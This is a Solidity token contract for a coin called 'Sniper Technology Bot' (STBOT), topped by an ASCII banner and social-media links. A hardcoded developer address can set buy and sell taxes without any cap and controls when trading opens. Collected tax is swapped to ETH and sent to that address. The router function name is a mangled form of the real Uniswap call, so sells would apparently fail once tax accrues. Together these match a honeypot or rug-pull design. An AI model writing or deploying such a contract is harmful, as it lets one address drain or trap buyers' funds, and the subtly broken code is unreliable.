/*
  /$$$$$$            /$$                              
 /$$__  $$          |__/                              
| $$  \__/ /$$$$$$$  /$$  /$$$$$$   /$$$$$$   /$$$$$$ 
|  $$$$$$ | $$__  $$| $$ /$$__  $$ /$$__  $$ /$$__  $$
 \____  $$| $$  \ $$| $$| $$  \ $$| $$$$$$$$| $$  \__/
 /$$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$      
|  $$$$$$/| $$  | $$| $$| $$$$$$$/|  $$$$$$$| $$      
 \______/ |__/  |__/|__/| $$____/  \_______/|__/      
                        | $$                          
                        | $$                          
                        |__/                     


 /$$$$$$$$                  /$$                           /$$                              
|__  $$__/                 | $$                          | $$                              
   | $$  /$$$$$$   /$$$$$$$| $$$$$$$  /$$$$$$$   /$$$$$$ | $$  /$$$$$$   /$$$$$$  /$$   /$$
   | $$ /$$__  $$ /$$_____/| $$__  $$| $$__  $$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$  | $$
   | $$| $$$$$$$$| $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$| $$  \ $$| $$  \ $$| $$  | $$
   | $$| $$_____/| $$      | $$  | $$| $$  | $$| $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$
   | $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$  | $$|  $$$$$$/| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$
   |__/ \_______/ \_______/|__/  |__/|__/  |__/ \______/ |__/ \______/  \____  $$ \____  $$
                                                                        /$$  \ $$ /$$  | $$
                                                                       |  $$$$$$/|  $$$$$$/
                                                                        \______/  \______/ 


 /$$$$$$$              /$$    
| $$__  $$            | $$    
| $$  \ $$  /$$$$$$  /$$$$$$  
| $$$$$$$  /$$__  $$|_  $$_/  
| $$__  $$| $$  \ $$  | $$    
| $$  \ $$| $$  | $$  | $$ /$$
| $$$$$$$/|  $$$$$$/  |  $$$$/
|_______/  \______/    \___/  
                              
                              
                                                                                                      
https://t.me/Sniper_Technology_Bots

https://twitter.com/STBOT_ERC

*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFtaxOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract STBOT {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   name_ = "Sniper Technology Bot"; 
        string public   symbol_ = "STBOT";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buyFtax = 0;
        uint256 sellFtax = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed DEVBOT,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant DEVBOT = payable(address(0x62e4A6Ad1b56137563611706521e00e0EbD4059c));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == DEVBOT || to == DEVBOT);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFtaxOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                DEVBOT.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FtaxAmount = amount * (from == pair ? buyFtax : sellFtax) / 100;
                amount -= FtaxAmount;
                balanceOf[address(this)] += FtaxAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == DEVBOT);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFtax(uint256 _buy, uint256 _sell) private {
            buyFtax = _buy;
            sellFtax = _sell;
        }

        function setFtax(uint256 _buy, uint256 _sell) external {
            if(msg.sender != DEVBOT)        
                revert Permissions();
            _setFtax(_buy, _sell);
        }
    }